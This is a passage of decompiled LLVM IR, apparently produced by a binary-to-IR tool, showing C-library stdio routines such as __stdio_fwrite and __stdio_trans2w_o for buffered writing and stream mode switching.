  %v3_19570 = phi i32 [ %v3_19570.pre, %dec_label_pc_19568thread-pre-split.dec_label_pc_19570_crit_edge ], [ 2147483647, %entry ]
  %v0_19574.in = phi i32 [ %v5_1958c, %dec_label_pc_19568thread-pre-split.dec_label_pc_19570_crit_edge ], [ %arg3, %entry ]
  %v3_19574 = phi i32 [ %v5_1958c, %dec_label_pc_19568thread-pre-split.dec_label_pc_19570_crit_edge ], [ %arg3, %entry ]
  %v0_19574 = icmp slt i32 %v0_19574.in, 0
  %storemerge = select i1 %v0_19574, i32 %v3_19570, i32 %v3_19574
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v0_19578, i32* %r1.global-to-local, align 4
  %v1_1957c = add i32 %v0_1957c, 4
  %v2_1957c = inttoptr i32 %v1_1957c to i32*
  %v3_1957c = load i32, i32* %v2_1957c, align 4
  %v3_19580 = call i32 @__GI_write(i32 %v3_1957c, i32 %v0_19578)
  %v1_19584 = icmp slt i32 %v3_19580, 0
  %v2_19584 = icmp eq i32 %v3_19580, 0
  store i1 %v2_19584, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_19584, label %dec_label_pc_19594, label %dec_label_pc_19568thread-pre-split

dec_label_pc_19594:                               ; preds = %dec_label_pc_19570
  %v0_19594 = load i32, i32* %r4.global-to-local, align 4
  %v1_19594 = inttoptr i32 %v0_19594 to i16*
  %v2_19594 = load i16, i16* %v1_19594, align 2
  %v3_19594 = zext i16 %v2_19594 to i32
  store i32 %v3_19594, i32* %r3.global-to-local, align 4
  %v1_19598 = add i32 %v0_19594, 8
  store i32 %v1_19598, i32* %r1.global-to-local, align 4
  %v1_1959c = inttoptr i32 %v1_19598 to i32*
  %v2_1959c = load i32, i32* %v1_1959c, align 4
  store i32 %v2_1959c, i32* %r1.global-to-local, align 4
  %v3_1959c = add i32 %v0_19594, 12
  %v4_1959c = inttoptr i32 %v3_1959c to i32*
  %v5_1959c = load i32, i32* %v4_1959c, align 4
  %v1_195a0 = or i32 %v3_19594, 8
  store i32 %v1_195a0, i32* %r3.global-to-local, align 4
  %v2_195a4 = sub i32 %v5_1959c, %v2_1959c
  store i32 %v2_195a4, i32* %r2.global-to-local, align 4
  %v9_195a4 = icmp eq i32 %v5_1959c, %v2_1959c
  store i1 %v9_195a4, i1* %cpsr_z.global-to-local, align 1
  %v1_195a8 = trunc i32 %v1_195a0 to i16
  store i16 %v1_195a8, i16* %v1_19594, align 2
  br i1 %v9_195a4, label %dec_label_pc_19594.dec_label_pc_195f4_crit_edge, label %dec_label_pc_195b0

dec_label_pc_19594.dec_label_pc_195f4_crit_edge:  ; preds = %dec_label_pc_19594
  %v0_195f4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_195f4

dec_label_pc_195b0:                               ; preds = %dec_label_pc_19594
  %v0_195b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_195b0 = load i32, i32* %r5.global-to-local, align 4
  %v3_195b0 = icmp ult i32 %v0_195b0, %v1_195b0
  %v9_195b0 = icmp eq i32 %v0_195b0, %v1_195b0
  store i1 %v9_195b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_195b0, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_195b0
  store i32 %v1_195b0, i32* %r2.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_195b0, %bb23
  %v2_195c4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %.preheader, %dec_label_pc_195d8
  %v2_195c4 = phi i32 [ %v2_195c4.pre, %.preheader ], [ %v1_195dc, %dec_label_pc_195d8 ]
  %v0_195b8 = load i32, i32* %r6.global-to-local, align 4
  %v1_195b8 = inttoptr i32 %v0_195b8 to i8*
  %v2_195b8 = load i8, i8* %v1_195b8, align 1
  %v3_195b8 = zext i8 %v2_195b8 to i32
  store i32 %v3_195b8, i32* %r3.global-to-local, align 4
  %v7_195bc = icmp eq i8 %v2_195b8, 10
  store i1 %v7_195bc, i1* %cpsr_z.global-to-local, align 1
  %v1_195c0 = add i32 %v0_195b8, 1
  store i32 %v1_195c0, i32* %r6.global-to-local, align 4
  %v3_195c4 = inttoptr i32 %v2_195c4 to i8*
  store i8 %v2_195b8, i8* %v3_195c4, align 1
  %v0_195c8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_195c8, label %dec_label_pc_195cc, label %dec_label_pc_195d8

dec_label_pc_195cc:                               ; preds = %bb24
  %v0_195cc = load i32, i32* %r4.global-to-local, align 4
  %v1_195cc = inttoptr i32 %v0_195cc to i16*
  %v2_195cc = load i16, i16* %v1_195cc, align 2
  %v3_195cc = zext i16 %v2_195cc to i32
  store i32 %v3_195cc, i32* %r3.global-to-local, align 4
  %v1_195d0 = and i32 %v3_195cc, 256
  %v2_195d0 = icmp eq i32 %v1_195d0, 0
  store i1 %v2_195d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_195d0, label %dec_label_pc_195d8, label %dec_label_pc_195cc.dec_label_pc_195e4_crit_edge

dec_label_pc_195cc.dec_label_pc_195e4_crit_edge:  ; preds = %dec_label_pc_195cc
  %v0_195e8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_195e4

dec_label_pc_195d8:                               ; preds = %dec_label_pc_195cc, %bb24
  %v0_195d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_195d8 = add i32 %v0_195d8, -1
  store i32 %v1_195d8, i32* %r2.global-to-local, align 4
  %v7_195d8 = icmp eq i32 %v0_195d8, 1
  store i1 %v7_195d8, i1* %cpsr_z.global-to-local, align 1
  %v0_195dc = load i32, i32* %r1.global-to-local, align 4
  %v1_195dc = add i32 %v0_195dc, 1
  store i32 %v1_195dc, i32* %r1.global-to-local, align 4
  br i1 %v7_195d8, label %dec_label_pc_195d8.dec_label_pc_195e4_crit_edge, label %bb24

dec_label_pc_195d8.dec_label_pc_195e4_crit_edge:  ; preds = %dec_label_pc_195d8
  %v0_195e4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_195e4

dec_label_pc_195e4:                               ; preds = %dec_label_pc_195cc.dec_label_pc_195e4_crit_edge, %dec_label_pc_195d8.dec_label_pc_195e4_crit_edge
  %v0_195e8 = phi i32 [ %v1_195dc, %dec_label_pc_195d8.dec_label_pc_195e4_crit_edge ], [ %v0_195e8.pre, %dec_label_pc_195cc.dec_label_pc_195e4_crit_edge ]
  %v0_195e4 = phi i32 [ %v0_195e4.pre, %dec_label_pc_195d8.dec_label_pc_195e4_crit_edge ], [ %v0_195cc, %dec_label_pc_195cc.dec_label_pc_195e4_crit_edge ]
  %v1_195e4 = add i32 %v0_195e4, 8
  %v2_195e4 = inttoptr i32 %v1_195e4 to i32*
  %v3_195e4 = load i32, i32* %v2_195e4, align 4
  store i32 %v3_195e4, i32* %r3.global-to-local, align 4
  %v2_195e8 = add i32 %v0_195e4, 16
  %v3_195e8 = inttoptr i32 %v2_195e8 to i32*
  store i32 %v0_195e8, i32* %v3_195e8, align 4
  %v0_195ec = load i32, i32* %r3.global-to-local, align 4
  %v1_195ec = load i32, i32* %r1.global-to-local, align 4
  %v2_195ec = sub i32 %v1_195ec, %v0_195ec
  store i32 %v2_195ec, i32* %r3.global-to-local, align 4
  %v1_195f0 = load i32, i32* %r5.global-to-local, align 4
  %v2_195f0 = sub i32 %v1_195f0, %v2_195ec
  store i32 %v2_195f0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_195f4

dec_label_pc_195f4:                               ; preds = %dec_label_pc_19594.dec_label_pc_195f4_crit_edge, %dec_label_pc_195e4
  %v0_195f4 = phi i32 [ %v0_195f4.pre, %dec_label_pc_19594.dec_label_pc_195f4_crit_edge ], [ %v2_195f0, %dec_label_pc_195e4 ]
  %v1_195f4 = load i32, i32* @r7, align 4
  %v2_195f4 = sub i32 %v1_195f4, %v0_195f4
  br label %dec_label_pc_195f8

dec_label_pc_19568.dec_label_pc_195f8.loopexit_crit_edge: ; preds = %dec_label_pc_19568thread-pre-split
  %v0_195f8.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_195f8

dec_label_pc_195f8:                               ; preds = %entry, %dec_label_pc_19568.dec_label_pc_195f8.loopexit_crit_edge, %dec_label_pc_195f4
  %v0_195f8 = phi i32 [ %v2_195f4, %dec_label_pc_195f4 ], [ %v0_195f8.pre.pre, %dec_label_pc_19568.dec_label_pc_195f8.loopexit_crit_edge ], [ 0, %entry ]
  %v2_195fc = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_195fc, i32* %r4.global-to-local, align 4
  ret i32 %v0_195f8

; uselistorder directives
  uselistorder i32 %v0_195e4, { 1, 0 }
  uselistorder i32 %v1_195dc, { 0, 2, 1 }
  uselistorder i32 %v0_195d8, { 1, 0 }
  uselistorder i32 %v1_195b0, { 0, 2, 1 }
  uselistorder i32 %v0_195b0, { 1, 0 }
  uselistorder i32 %v5_1959c, { 1, 0 }
  uselistorder i32 %v2_1959c, { 1, 0, 2 }
  uselistorder i32 %v3_19580, { 2, 3, 0, 1 }
  uselistorder i32 %v0_19578, { 1, 0 }
  uselistorder i32 %v5_1958c, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 2, 1, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 2, 4, 3, 5, 6, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 5, 2, 3, 6, 7, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32)* @__GI_write, { 2, 1, 3, 0 }
  uselistorder i32 2147483647, { 1, 6, 2, 5, 3, 4, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_195f8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_195f4, { 1, 0 }
  uselistorder label %dec_label_pc_195e4, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_19570, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_19604 = load i32, i32* @r4, align 4
  store i32 %v3_19604, i32* %stack_var_-20, align 4
  %v6_19604 = load i32, i32* @r5, align 4
  %v9_19604 = load i32, i32* @r6, align 4
  %v12_19604 = load i32, i32* @r7, align 4
  %v3_19608 = load i16, i16* %arg3, align 2
  %v4_19608 = zext i16 %v3_19608 to i32
  %v1_1960c = and i32 %v4_19608, 512
  store i32 %v1_1960c, i32* @r4, align 4
  %v2_1960c = icmp eq i32 %v1_1960c, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1960c, label %dec_label_pc_19624, label %dec_label_pc_19720

dec_label_pc_19624:                               ; preds = %entry
  %v2_19624 = add i32 %tmp, 4
  %v3_19624 = inttoptr i32 %v2_19624 to i32*
  %v4_19624 = load i32, i32* %v3_19624, align 4
  %v2_1962c = add i32 %tmp, 16
  %v3_1962c = inttoptr i32 %v2_1962c to i32*
  %v4_1962c = load i32, i32* %v3_1962c, align 4
  store i32 %v4_1962c, i32* @r0, align 4
  %v2_19630 = add i32 %tmp, 12
  %v3_19630 = inttoptr i32 %v2_19630 to i32*
  %v4_19630 = load i32, i32* %v3_19630, align 4
  store i32 %v4_19630, i32* @r3, align 4
  %v4_19634 = icmp eq i32 %v4_19624, -2
  %v2_19638 = sub i32 %v4_19630, %v4_1962c
  br i1 %v4_19634, label %dec_label_pc_19638, label %dec_label_pc_19660

dec_label_pc_19638:                               ; preds = %dec_label_pc_19624
  %v3_1963c = icmp ugt i32 %v2_19638, %arg2
  br i1 %v3_1963c, label %bb, label %bb12

bb:                                               ; preds = %dec_label_pc_19638
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_19638, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_19638, %dec_label_pc_19638 ]
  %v0_19644 = phi i32 [ %arg2, %bb ], [ %v2_19638, %dec_label_pc_19638 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_19644, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1964c = call i32 @memcpy()
  %v0_19650 = load i32, i32* @r5, align 4
  %v1_19650 = add i32 %v0_19650, 16
  %v2_19650 = inttoptr i32 %v1_19650 to i32*
  %v3_19650 = load i32, i32* %v2_19650, align 4
  %v1_19654 = load i32, i32* @r4, align 4
  %v2_19654 = add i32 %v1_19654, %v3_19650
  store i32 %v2_19654, i32* %v2_19650, align 4
  br label %dec_label_pc_19734

dec_label_pc_19660:                               ; preds = %dec_label_pc_19624
  store i32 %v2_19638, i32* @r3, align 4
  %tmp18 = icmp ult i32 %v2_19638, %arg2
  br i1 %tmp18, label %dec_label_pc_19700, label %dec_label_pc_1966c

dec_label_pc_1966c:                               ; preds = %dec_label_pc_19660
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_19674 = call i32 @memcpy()
  %v0_19678 = load i32, i32* @r5, align 4
  %v1_19678 = add i32 %v0_19678, 16
  %v2_19678 = inttoptr i32 %v1_19678 to i32*
  %v3_19678 = load i32, i32* %v2_19678, align 4
  %v1_1967c = inttoptr i32 %v0_19678 to i16*
  %v2_1967c = load i16, i16* %v1_1967c, align 2
  %v1_19680 = load i32, i32* @r6, align 4
  %v2_19680 = add i32 %v1_19680, %v3_19678
  %v1_19684 = and i16 %v2_1967c, 256
  %v2_19684 = icmp eq i16 %v1_19684, 0
  store i32 %v2_19680, i32* %v2_19678, align 4
  br i1 %v2_19684, label %dec_label_pc_19734, label %dec_label_pc_19690

dec_label_pc_19690:                               ; preds = %dec_label_pc_1966c
  %v0_19690 = load i32, i32* @r7, align 4
  %v0_19698 = load i32, i32* @r6, align 4
  %v4_1969c = call i32 @memrchr(i32 %v0_19690, i32 10, i32 %v0_19698, i32 %v2_19680)
  %v2_196a0 = icmp eq i32 %v4_1969c, 0
  br i1 %v2_196a0, label %dec_label_pc_19734, label %dec_label_pc_196a8

dec_label_pc_196a8:                               ; preds = %dec_label_pc_19690
  %v0_196a8 = load i32, i32* @r5, align 4
  store i32 %v0_196a8, i32* @r0, align 4
  %v0_196ac = call i32 @__stdio_wcommit()
  %v2_196b0 = icmp eq i32 %v0_196ac, 0
  br i1 %v2_196b0, label %dec_label_pc_19734, label %dec_label_pc_196b8

dec_label_pc_196b8:                               ; preds = %dec_label_pc_196a8
  %v1_196b8 = load i32, i32* @r6, align 4
  %v3_196b8 = icmp uge i32 %v0_196ac, %v1_196b8
  %v1_196b8.v0_196ac = select i1 %v3_196b8, i32 %v1_196b8, i32 %v0_196ac
  store i32 %v1_196b8.v0_196ac, i32* @r4, align 4
  %v2_196c4 = sub i32 %v1_196b8, %v1_196b8.v0_196ac
  %v0_196c8 = load i32, i32* @r7, align 4
  %v2_196c8 = add i32 %v0_196c8, %v2_196c4
  store i32 %v2_196c8, i32* %r7.global-to-local, align 4
  store i32 %v2_196c8, i32* @r0, align 4
  store i32 %v1_196b8.v0_196ac, i32* @r2, align 4
  %v4_196d8 = call i32 @__GI_memchr(i32 %v2_196c8, i32 10, i32 %v1_196b8.v0_196ac, i32 %v2_196c4)
  %v2_196dc = icmp eq i32 %v4_196d8, 0
  br i1 %v2_196dc, label %dec_label_pc_19734, label %dec_label_pc_196e4

dec_label_pc_196e4:                               ; preds = %dec_label_pc_196b8
  %v0_196e4 = load i32, i32* @r5, align 4
  %v1_196e4 = add i32 %v0_196e4, 16
  %v2_196e4 = inttoptr i32 %v1_196e4 to i32*
  %v3_196e4 = load i32, i32* %v2_196e4, align 4
  %v0_196e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_196e8 = load i32, i32* @r4, align 4
  %v2_196e8 = sub i32 %v0_196e8, %v4_196d8
  %v2_196ec = add i32 %v2_196e8, %v1_196e8
  %v2_196f0 = sub i32 %v3_196e4, %v2_196ec
  %v1_196f4 = load i32, i32* @r6, align 4
  %v2_196f4 = sub i32 %v1_196f4, %v2_196ec
  store i32 %v2_196f4, i32* @r6, align 4
  store i32 %v2_196f0, i32* %v2_196e4, align 4
  br label %dec_label_pc_19734

dec_label_pc_19700:                               ; preds = %dec_label_pc_19660
  %v2_19700 = add i32 %tmp, 8
  %v3_19700 = inttoptr i32 %v2_19700 to i32*
  %v4_19700 = load i32, i32* %v3_19700, align 4
  %v9_19704 = icmp eq i32 %v4_1962c, %v4_19700
  br i1 %v9_19704, label %dec_label_pc_19720, label %dec_label_pc_1970c

dec_label_pc_1970c:                               ; preds = %dec_label_pc_19700
  store i32 %tmp, i32* @r0, align 4
  %v0_19710 = call i32 @__stdio_wcommit()
  %v2_19714 = icmp eq i32 %v0_19710, 0
  br i1 %v2_19714, label %dec_label_pc_1970c.dec_label_pc_19720_crit_edge, label %bb15

dec_label_pc_1970c.dec_label_pc_19720_crit_edge:  ; preds = %dec_label_pc_1970c
  %v0_19720.pre = load i32, i32* @r6, align 4
  %v0_19724.pre = load i32, i32* @r5, align 4
  %v0_19728.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_19720

bb15:                                             ; preds = %dec_label_pc_1970c
  %v1_19718 = load i32, i32* @r4, align 4
  store i32 %v1_19718, i32* @r6, align 4
  br label %dec_label_pc_19734

dec_label_pc_19720:                               ; preds = %dec_label_pc_1970c.dec_label_pc_19720_crit_edge, %entry, %dec_label_pc_19700
  %v0_19728 = phi i32 [ %v0_19728.pre, %dec_label_pc_1970c.dec_label_pc_19720_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_19700 ]
  %v0_19724 = phi i32 [ %v0_19724.pre, %dec_label_pc_1970c.dec_label_pc_19720_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_19700 ]
  %v0_19720 = phi i32 [ %v0_19720.pre, %dec_label_pc_1970c.dec_label_pc_19720_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_19700 ]
  %v1_19724 = inttoptr i32 %v0_19724 to i16*
  %v5_1972c = call i32 @__stdio_WRITE(i16* %v1_19724, i32 %v0_19728, i32 %v0_19720)
  store i32 %v5_1972c, i32* @r6, align 4
  br label %dec_label_pc_19734

dec_label_pc_19734:                               ; preds = %bb15, %dec_label_pc_196b8, %dec_label_pc_196a8, %dec_label_pc_19690, %dec_label_pc_1966c, %dec_label_pc_196e4, %bb12, %dec_label_pc_19720
  %v0_19734 = load i32, i32* @r6, align 4
  %v2_1973c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1973c, i32* @r4, align 4
  store i32 %v6_19604, i32* @r5, align 4
  store i32 %v9_19604, i32* @r6, align 4
  store i32 %v12_19604, i32* @r7, align 4
  ret i32 %v0_19734

; uselistorder directives
  uselistorder i32 %v2_196ec, { 1, 0 }
  uselistorder i32 %v2_196c4, { 1, 0 }
  uselistorder i32 %v1_196b8.v0_196ac, { 1, 2, 0, 3 }
  uselistorder i32 %v1_196b8, { 1, 0, 2 }
  uselistorder i32 %v2_19638, { 2, 4, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_19734, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_19720, { 0, 2, 1 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19744 = load i32, i32* @r4, align 4
  store i32 %v3_19744, i32* %stack_var_-8, align 4
  %v3_19748 = load i16, i16* %arg1, align 2
  %v4_19748 = zext i16 %v3_19748 to i32
  %v2_1974c = and i32 %v4_19748, %arg2
  %v4_1974c = icmp eq i32 %v2_1974c, 0
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_1974c, label %dec_label_pc_19758, label %dec_label_pc_19768

dec_label_pc_19758:                               ; preds = %entry
  %v1_19758 = and i32 %v4_19748, 2176
  %v2_19758 = icmp eq i32 %v1_19758, 0
  br i1 %v2_19758, label %dec_label_pc_19760, label %dec_label_pc_19774

dec_label_pc_19760:                               ; preds = %dec_label_pc_19758
  %v2_19760 = or i32 %v4_19748, %arg2
  %v1_19764 = trunc i32 %v2_19760 to i16
  store i16 %v1_19764, i16* %arg1, align 2
  %v0_19768.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19768

dec_label_pc_19768:                               ; preds = %entry, %dec_label_pc_19760
  %v0_197a4 = phi i32 [ %tmp, %entry ], [ %v0_19768.pre, %dec_label_pc_19760 ]
  %v1_19768 = inttoptr i32 %v0_197a4 to i16*
  %v2_19768 = load i16, i16* %v1_19768, align 2
  %v3_19768 = zext i16 %v2_19768 to i32
  store i32 %v3_19768, i32* @ip, align 4
  %v1_1976c = and i32 %v3_19768, 32
  %v2_1976c = icmp eq i32 %v1_1976c, 0
  br i1 %v2_1976c, label %dec_label_pc_19794, label %dec_label_pc_19774

dec_label_pc_19774:                               ; preds = %dec_label_pc_19758, %dec_label_pc_19768
  %v0_19774 = call i32 @__GI___errno_location()
  store i32 %v0_19774, i32* %r0.global-to-local, align 4
  %v2_1977c = inttoptr i32 %v0_19774 to i32*
  store i32 9, i32* %v2_1977c, align 4
  br label %dec_label_pc_19780

dec_label_pc_19780:                               ; preds = %dec_label_pc_197bc, %dec_label_pc_19774
  %v0_19780 = load i32, i32* @r4, align 4
  %v1_19780 = inttoptr i32 %v0_19780 to i16*
  %v2_19780 = load i16, i16* %v1_19780, align 2
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_19788 = or i16 %v2_19780, 8
  store i16 %v1_19788, i16* %v1_19780, align 2
  br label %bb11

dec_label_pc_19794:                               ; preds = %dec_label_pc_19768
  %tmp14 = urem i16 %v2_19768, 4
  %v2_19794 = icmp eq i16 %tmp14, 0
  br i1 %v2_19794, label %dec_label_pc_197f0, label %dec_label_pc_1979c

dec_label_pc_1979c:                               ; preds = %dec_label_pc_19794
  %v1_1979c = and i32 %v3_19768, 4
  store i32 %v1_1979c, i32* @r1, align 4
  %v2_1979c = icmp eq i32 %v1_1979c, 0
  br i1 %v2_1979c, label %dec_label_pc_197a4, label %dec_label_pc_197d4

dec_label_pc_197a4:                               ; preds = %dec_label_pc_1979c
  %v1_197a4 = add i32 %v0_197a4, 20
  %v2_197a4 = inttoptr i32 %v1_197a4 to i32*
  %v3_197a4 = load i32, i32* %v2_197a4, align 4
  store i32 %v3_197a4, i32* %r2.global-to-local, align 4
  %v1_197a8 = add i32 %v0_197a4, 16
  %v2_197a8 = inttoptr i32 %v1_197a8 to i32*
  %v3_197a8 = load i32, i32* %v2_197a8, align 4
  %v9_197ac = icmp eq i32 %v3_197a4, %v3_197a8
  br i1 %v9_197ac, label %dec_label_pc_197b4, label %dec_label_pc_197bc

dec_label_pc_197b4:                               ; preds = %dec_label_pc_197a4
  %v1_197b4 = and i32 %v3_19768, 2
  %v2_197b4 = icmp eq i32 %v1_197b4, 0
  br i1 %v2_197b4, label %dec_label_pc_197d4, label %dec_label_pc_197bc

dec_label_pc_197bc:                               ; preds = %dec_label_pc_197a4, %dec_label_pc_197b4
  %v1_197bc = and i32 %v3_19768, 1024
  %tmp12 = udiv i32 %v1_197bc, 1024
  %tmp13 = add nuw nsw i32 %tmp12, 1
  store i32 %tmp13, i32* %r2.global-to-local, align 4
  %v0_197c8 = call i32 @__GI_fseek()
  store i32 %v0_197c8, i32* %r0.global-to-local, align 4
  %v2_197cc = icmp eq i32 %v0_197c8, 0
  br i1 %v2_197cc, label %.dec_label_pc_197d4_crit_edge, label %dec_label_pc_19780

.dec_label_pc_197d4_crit_edge:                    ; preds = %dec_label_pc_197bc
  %v0_197d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_197d4

dec_label_pc_197d4:                               ; preds = %.dec_label_pc_197d4_crit_edge, %dec_label_pc_1979c, %dec_label_pc_197b4
  %v2_197e0 = phi i32 [ %v0_197d4.pre, %.dec_label_pc_197d4_crit_edge ], [ %v0_197a4, %dec_label_pc_1979c ], [ %v0_197a4, %dec_label_pc_197b4 ]
  %v1_197d4 = inttoptr i32 %v2_197e0 to i16*
  %v2_197d4 = load i16, i16* %v1_197d4, align 2
  %v1_197d8 = add i32 %v2_197e0, 8
  %v2_197d8 = inttoptr i32 %v1_197d8 to i32*
  %v3_197d8 = load i32, i32* %v2_197d8, align 4
  store i32 %v3_197d8, i32* %r2.global-to-local, align 4
  %v1_197dc = and i16 %v2_197d4, -4
  store i16 %v1_197dc, i16* %v1_197d4, align 2
  %v0_197e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_197e4 = load i32, i32* @r4, align 4
  %v2_197e4 = add i32 %v1_197e4, 20
  %v3_197e4 = inttoptr i32 %v2_197e4 to i32*
  store i32 %v0_197e4, i32* %v3_197e4, align 4
  %v0_197e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_197e8 = load i32, i32* @r4, align 4
  %v2_197e8 = add i32 %v1_197e8, 24
  %v3_197e8 = inttoptr i32 %v2_197e8 to i32*
  store i32 %v0_197e8, i32* %v3_197e8, align 4
  %v0_197ec = load i32, i32* %r2.global-to-local, align 4
  %v1_197ec = load i32, i32* @r4, align 4
  %v2_197ec = add i32 %v1_197ec, 16
  %v3_197ec = inttoptr i32 %v2_197ec to i32*
  store i32 %v0_197ec, i32* %v3_197ec, align 4
  %v0_197f0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_197f0

dec_label_pc_197f0:                               ; preds = %dec_label_pc_19794, %dec_label_pc_197d4
  %v2_197fc = phi i32 [ %v0_197a4, %dec_label_pc_19794 ], [ %v0_197f0.pre, %dec_label_pc_197d4 ]
  %v1_197f0 = inttoptr i32 %v2_197fc to i16*
  %v2_197f0 = load i16, i16* %v1_197f0, align 2
  %v3_197f0 = zext i16 %v2_197f0 to i32
  %v1_197f4 = or i16 %v2_197f0, 64
  %v1_197f8 = and i32 %v3_197f0, 2816
  store i32 %v1_197f8, i32* %r0.global-to-local, align 4
  %v2_197f8 = icmp eq i32 %v1_197f8, 0
  store i16 %v1_197f4, i16* %v1_197f0, align 2
  br i1 %v2_197f8, label %bb10, label %.thread1

bb10:                                             ; preds = %dec_label_pc_197f0
  %v1_19800 = load i32, i32* @r4, align 4
  %v2_19800 = add i32 %v1_19800, 12
  %v3_19800 = inttoptr i32 %v2_19800 to i32*
  %v4_19800 = load i32, i32* %v3_19800, align 4
  %v3_19804 = add i32 %v1_19800, 28
  %v4_19804 = inttoptr i32 %v3_19804 to i32*
  store i32 %v4_19800, i32* %v4_19804, align 4
  br label %bb11

.thread1:                                         ; preds = %dec_label_pc_197f0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb11

bb11:                                             ; preds = %bb10, %dec_label_pc_19780, %.thread1
  %v2_1980c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1980c, i32* @r4, align 4
  %v1_19810 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_19810

; uselistorder directives
  uselistorder i32 %v2_197e0, { 1, 0 }
  uselistorder i32 %v0_197a4, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_19748, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 4, 3, 5 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %bb11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_197f0, { 1, 0 }
  uselistorder label %dec_label_pc_197d4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_197bc, { 1, 0 }
  uselistorder label %dec_label_pc_19774, { 1, 0 }
  uselistorder label %dec_label_pc_19768, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_19814 = load i32, i32* @r2, align 4
  %v1_19814 = icmp slt i32 %v0_19814, 0
  %v0_19818 = load i32, i32* @r0, align 4
  %v1_1981c = and i32 %v0_19818, 2048
  %v2_19850 = icmp eq i32 %v1_1981c, 0
  br i1 %v1_19814, label %dec_label_pc_19850, label %dec_label_pc_19824

dec_label_pc_19824:                               ; preds = %entry
  br i1 %v2_19850, label %dec_label_pc_1982c, label %dec_label_pc_19858

dec_label_pc_1982c:                               ; preds = %dec_label_pc_19824
  %v7_1982c = icmp eq i32 %v0_19818, 256
  %v0_19830 = load i32, i32* @r1, align 4
  %v1_19830 = inttoptr i32 %v0_19830 to i32*
  %v2_19830 = load i32, i32* %v1_19830, align 4
  %v2_19834 = urem i32 %v2_19830, 256
  %v2_19834.v2_19830 = select i1 %v7_1982c, i32 %v2_19834, i32 %v2_19830
  br i1 %v7_1982c, label %.thread, label %dec_label_pc_1983c

dec_label_pc_1983c:                               ; preds = %dec_label_pc_1982c
  %v7_1983c = icmp eq i32 %v0_19818, 512
  br i1 %v7_1983c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1983c
  %v4_19844 = urem i32 %v2_19834.v2_19830, 65536
  br label %.thread

